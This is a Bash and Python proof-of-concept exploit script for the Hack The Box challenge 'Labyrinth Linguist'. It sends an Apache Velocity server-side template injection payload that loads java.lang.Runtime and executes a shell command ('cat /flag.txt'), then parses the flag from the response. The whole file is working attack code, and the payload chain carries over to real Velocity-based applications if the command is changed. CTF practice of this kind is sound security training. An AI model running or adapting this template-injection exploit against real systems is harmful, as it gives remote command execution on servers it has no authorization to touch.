#!/usr/bin/env bash
set -euo pipefail

# -----------------------------------------------------------------------------
# PoC: Hack The Box - Labyrinth Linguist
# Type: Apache Velocity SSTI -> Java Runtime command execution
#
# This script is intended for authorized CTF infrastructure only.
# -----------------------------------------------------------------------------

readonly SCRIPT_NAME="$(basename "$0")"
readonly DEFAULT_TIMEOUT=20

BASE_URL=""
HOST=""
PORT=""
TIMEOUT="${DEFAULT_TIMEOUT}"
JSON_OUTPUT=0
VERBOSE=0

usage() {
  cat <<EOF
Usage:
  ${SCRIPT_NAME} <base_url>
  ${SCRIPT_NAME} <host> <port>
  ${SCRIPT_NAME} --base-url <url> [options]
  ${SCRIPT_NAME} --host <host> --port <port> [options]

Options:
  --base-url <url>      Target base URL (example: http://154.57.164.76:30854/)
  --host <host>         Target host/IP
  --port <port>         Target port
  --timeout <seconds>   Request timeout in seconds (default: ${DEFAULT_TIMEOUT})
  --json                Print result as JSON
  --verbose             Enable verbose debug output
  -h, --help            Show this help message

Exit codes:
  0  Success (flag extracted)
  1  Generic failure
  2  Invalid arguments
  3  Connectivity/request failure
  4  Flag not found in response
EOF
}

log_info() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[*] %s\n' "$*" >&2
  fi
}

log_debug() {
  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[D] %s\n' "$*" >&2
  fi
}

log_ok() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[+] %s\n' "$*" >&2
  fi
}

log_error() {
  printf '[-] %s\n' "$*" >&2
}

parse_args() {
  local positional=()
  while [[ $# -gt 0 ]]; do
    case "$1" in
      --base-url)
        BASE_URL="${2:-}"
        shift 2
        ;;
      --host)
        HOST="${2:-}"
        shift 2
        ;;
      --port)
        PORT="${2:-}"
        shift 2
        ;;
      --timeout)
        TIMEOUT="${2:-}"
        shift 2
        ;;
      --json)
        JSON_OUTPUT=1
        shift
        ;;
      --verbose)
        VERBOSE=1
        shift
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -*)
        log_error "Unknown option: $1"
        usage >&2
        exit 2
        ;;
      *)
        positional+=("$1")
        shift
        ;;
    esac
  done

  if [[ -z "${BASE_URL}" ]]; then
    if [[ ${#positional[@]} -eq 1 ]]; then
      BASE_URL="${positional[0]}"
    elif [[ ${#positional[@]} -ge 2 ]]; then
      HOST="${positional[0]}"
      PORT="${positional[1]}"
    fi
  fi

  if [[ -z "${BASE_URL}" ]]; then
    if [[ -n "${HOST}" && -n "${PORT}" ]]; then
      BASE_URL="http://${HOST}:${PORT}/"
    fi
  fi

  if [[ -z "${BASE_URL}" ]]; then
    log_error "Provide either base URL or host+port."
    usage >&2
    exit 2
  fi
}

main() {
  parse_args "$@"

  log_info "Target: ${BASE_URL}"
  log_info "Submitting Velocity SSTI payload..."

  local result
  if ! result="$(python3 - "$BASE_URL" "$TIMEOUT" "$VERBOSE" <<'PY'
import re
import sys
import requests

base = sys.argv[1].rstrip("/") + "/"
timeout = float(sys.argv[2])
verbose = sys.argv[3] == "1"

payload = (
    "#set($x='')"
    "#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())"
    "#set($p=$rt.exec('cat /flag.txt'))"
    "#set($sc=$x.class.forName('java.util.Scanner')"
    ".getConstructor($x.class.forName('java.io.InputStream'))"
    ".newInstance($p.getInputStream())"
    ".useDelimiter('\\\\A'))"
    "$sc.next()"
)

try:
    response = requests.post(base, data={"text": payload}, timeout=timeout)
    response.raise_for_status()
except requests.RequestException as exc:
    print(f"ERR_REQUEST:{exc}")
    raise SystemExit(3)

if verbose:
    print(f"DBG_STATUS:{response.status_code}")
    print(f"DBG_URL:{response.url}")

flag = re.search(r"HTB\{[^}]+\}", response.text)
if not flag:
    print("ERR_NOFLAG:Flag not found in response")
    raise SystemExit(4)

print(f"OK_FLAG:{flag.group(0)}")
PY
  )"; then
    case "$?" in
      3) log_error "Connectivity/request failure."; exit 3 ;;
      4) log_error "Flag not found in response."; exit 4 ;;
      *) log_error "Unexpected runtime failure."; exit 1 ;;
    esac
  fi

  log_debug "Exploit output: ${result}"
  local flag
  flag="$(printf '%s\n' "${result}" | sed -n 's/^OK_FLAG://p' | tail -n 1)"
  if [[ -z "${flag}" ]]; then
    log_error "No flag extracted from output."
    exit 4
  fi

  if [[ "${JSON_OUTPUT}" -eq 1 ]]; then
    printf '{"target":"%s","flag":"%s"}\n' "${BASE_URL}" "${flag}"
  else
    log_ok "Flag extracted successfully."
    printf '%s\n' "${flag}"
  fi
}

main "$@"
